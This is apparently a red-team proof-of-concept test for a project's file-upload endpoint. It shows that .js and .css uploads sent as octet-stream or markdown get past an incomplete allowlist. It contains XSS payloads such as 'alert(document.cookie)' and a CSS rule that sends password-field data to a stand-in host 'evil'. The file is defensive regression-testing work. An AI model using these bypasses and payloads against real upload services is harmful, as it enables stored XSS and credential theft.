#!/usr/bin/env npx tsx
// Red-team PoC for unit-01 (Upload content validation) — bolt 1.
//
// Demonstrates that the V-01/V-02 fix landed an INCOMPLETE allowlist:
//   - `.js` and `.css` extensions are NOT in BLOCKED_EXTENSIONS
//   - `application/octet-stream` is on ALLOWED_MIMES_*
//   - serveFile actively returns Content-Type: application/javascript / text/css
//     when the served file's extension is .js / .css
//
// Net effect: the same threat model V-01/V-02 was meant to close
// (stored-XSS via served file under reviewer's tunnel origin) is still
// reachable by trading `.html` for `.js` and `image/svg+xml` for
// `application/octet-stream`.
//
// Run: npx tsx packages/haiku/test/red-team-unit-01-upload-bypass.test.mjs
//
// IMPORTANT: this test asserts the BYPASS behaviour exists. It is
// EXPECTED TO FAIL once security-engineer bolt 2 closes the findings
// (R-01, R-02, R-03 — see RED-TEAM-unit-01.md). When the fixes land,
// invert the assertions to assert REJECTION (415 instead of 200) and
// the test becomes a regression guard.

import assert from "node:assert"
import { chmodSync, mkdirSync, mkdtempSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"

const tmp = mkdtempSync(join(tmpdir(), "haiku-redteam-unit01-"))
const projDir = join(tmp, "project")
const haikuRoot = join(projDir, ".haiku")
const intentSlug = "redteam-unit01"
const intentDirPath = join(haikuRoot, "intents", intentSlug)
const stageName = "design"

mkdirSync(join(intentDirPath, "stages", stageName, "units"), { recursive: true })
mkdirSync(join(intentDirPath, "stages", stageName, "artifacts"), {
	recursive: true,
})
mkdirSync(join(intentDirPath, "knowledge"), { recursive: true })

writeFileSync(
	join(intentDirPath, "intent.md"),
	`---
title: Red Team PoC Intent
studio: software
mode: continuous
active_stage: ${stageName}
status: active
stages:
  - ${stageName}
started_at: 2026-05-01T00:00:00Z
completed_at: null
---
`,
)

writeFileSync(
	join(intentDirPath, "stages", stageName, "state.json"),
	JSON.stringify({
		stage: stageName,
		status: "active",
		phase: "execute",
		visits: 0,
		iteration: 1,
	}),
)

const fakeBinDir = join(tmp, "fake-bin")
mkdirSync(fakeBinDir, { recursive: true })
writeFileSync(join(fakeBinDir, "git"), "#!/bin/sh\nexit 0\n")
chmodSync(join(fakeBinDir, "git"), 0o755)
process.env.PATH = `${fakeBinDir}:${process.env.PATH}`

process.chdir(projDir)

const { startHttpServer, stopHttpServer } = await import("../src/http.ts")

let passed = 0
let failed = 0

async function test(name, fn) {
	try {
		await fn()
		passed++
		console.log(`  PASS ${name}`)
	} catch (e) {
		failed++
		console.log(`  FAIL ${name}: ${e.message}`)
		if (process.env.VERBOSE) console.log(e.stack)
	}
}

function buildMultipart(fields, files) {
	const boundary = `----RTBoundary${Math.random().toString(36).slice(2)}`
	const parts = []
	for (const [name, value] of Object.entries(fields)) {
		parts.push(
			`--${boundary}\r\n` +
				`Content-Disposition: form-data; name="${name}"\r\n\r\n` +
				`${value}\r\n`,
		)
	}
	for (const { name, filename, content, contentType } of files) {
		const ct = contentType ?? "application/octet-stream"
		parts.push(
			`--${boundary}\r\n` +
				`Content-Disposition: form-data; name="${name}"; filename="${filename}"\r\n` +
				`Content-Type: ${ct}\r\n\r\n`,
		)
		parts.push(content)
		parts.push("\r\n")
	}
	parts.push(`--${boundary}--\r\n`)
	const buffers = parts.map((p) =>
		typeof p === "string" ? Buffer.from(p, "utf-8") : p,
	)
	return {
		body: Buffer.concat(buffers),
		contentType: `multipart/form-data; boundary=${boundary}`,
	}
}

async function run() {
	const port = await startHttpServer()
	const baseUrl = `http://127.0.0.1:${port}`

	console.log("\n=== Red-team PoC: V-01/V-02 bypass via .js/.css + octet-stream ===")

	await test(
		"R-01: .js upload accepted via application/octet-stream MIME bypasses V-01/V-02 allowlist",
		async () => {
			const payload = Buffer.from("alert(document.cookie); // pwn.js")
			const { body, contentType } = buildMultipart(
				{
					stage: stageName,
					target_path: "artifacts/pwn.js",
					mode: "upsert",
					attribute_to_user: "attacker",
				},
				[
					{
						name: "file",
						filename: "pwn.js",
						content: payload,
						contentType: "application/octet-stream",
					},
				],
			)
			const res = await fetch(
				`${baseUrl}/api/intents/${intentSlug}/uploads/stage-output`,
				{
					method: "POST",
					headers: { "Content-Type": contentType },
					body,
				},
			)
			// CURRENT BEHAVIOUR (vulnerable): 200 OK — server accepts the .js
			// payload because .js is not in BLOCKED_EXTENSIONS and
			// application/octet-stream is on ALLOWED_MIMES_STAGE_OUTPUT.
			assert.strictEqual(
				res.status,
				200,
				`R-01: expected the BYPASS — server should accept .js (currently does). got ${res.status}. If this is now 415, the vuln is fixed and this test should be inverted.`,
			)
			const data = await res.json()
			assert.ok(data.ok, "Upload succeeded")
			assert.strictEqual(
				data.path,
				"stages/design/artifacts/pwn.js",
				"File landed under artifacts/ as .js",
			)
		},
	)

	await test(
		"R-02: .css upload accepted — stylesheet injection vector",
		async () => {
			const payload = Buffer.from(
				"input[type=password] { background: url(https://evil/x); }",
			)
			const { body, contentType } = buildMultipart(
				{
					stage: stageName,
					target_path: "artifacts/pwn.css",
					mode: "upsert",
					attribute_to_user: "attacker",
				},
				[
					{
						name: "file",
						filename: "pwn.css",
						content: payload,
						contentType: "application/octet-stream",
					},
				],
			)
			const res = await fetch(
				`${baseUrl}/api/intents/${intentSlug}/uploads/stage-output`,
				{
					method: "POST",
					headers: { "Content-Type": contentType },
					body,
				},
			)
			assert.strictEqual(
				res.status,
				200,
				`R-02: expected the BYPASS — server should accept .css. got ${res.status}.`,
			)
		},
	)

	await test(
		"R-03: text/markdown MIME + .js extension also bypasses (MIME-spoof inverse)",
		async () => {
			const payload = Buffer.from("alert('via markdown MIME spoof');")
			const { body, contentType } = buildMultipart(
				{
					stage: stageName,
					target_path: "artifacts/spoof.js",
					mode: "upsert",
					attribute_to_user: "attacker",
				},
				[
					{
						name: "file",
						filename: "spoof.js",
						content: payload,
						contentType: "text/markdown",
					},
				],
			)
			const res = await fetch(
				`${baseUrl}/api/intents/${intentSlug}/uploads/stage-output`,
				{
					method: "POST",
					headers: { "Content-Type": contentType },
					body,
				},
			)
			assert.strictEqual(
				res.status,
				200,
				`R-03: expected the BYPASS — text/markdown + .js should reject by symmetry with V-02 (.html + text/plain rejects), but currently accepts. got ${res.status}.`,
			)
		},
	)

	await test(
		"R-04 (positive control): the V-02 fix DOES still reject .html + text/plain",
		async () => {
			const payload = Buffer.from("<script>alert(1)</script>")
			const { body, contentType } = buildMultipart(
				{
					stage: stageName,
					target_path: "artifacts/control.html",
					mode: "upsert",
					attribute_to_user: "attacker",
				},
				[
					{
						name: "file",
						filename: "control.html",
						content: payload,
						contentType: "text/plain",
					},
				],
			)
			const res = await fetch(
				`${baseUrl}/api/intents/${intentSlug}/uploads/stage-output`,
				{
					method: "POST",
					headers: { "Content-Type": contentType },
					body,
				},
			)
			assert.strictEqual(
				res.status,
				415,
				`Positive control: V-02 fix should still reject .html. Got ${res.status}.`,
			)
		},
	)

	await stopHttpServer()
	console.log(`\n${passed} passed, ${failed} failed`)
	if (failed > 0) process.exit(1)
}

run().catch((err) => {
	console.error("Test runner failed:", err)
	process.exit(1)
})
